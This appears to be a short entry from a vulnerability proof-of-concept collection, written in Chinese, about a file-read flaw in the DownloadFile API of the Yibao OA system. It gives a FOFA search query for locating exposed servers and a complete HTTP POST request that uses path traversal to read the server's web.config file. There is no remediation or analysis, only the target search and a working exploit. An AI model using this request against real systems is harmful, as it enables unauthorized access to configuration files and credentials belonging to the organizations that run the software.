## 易宝OA系统DownloadFile接口存在文件读取漏洞

## fofa
```
"顶讯科技"
```

## poc
```
POST /api/files/DownloadFile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
Content-Length: 94
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded

token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000
```
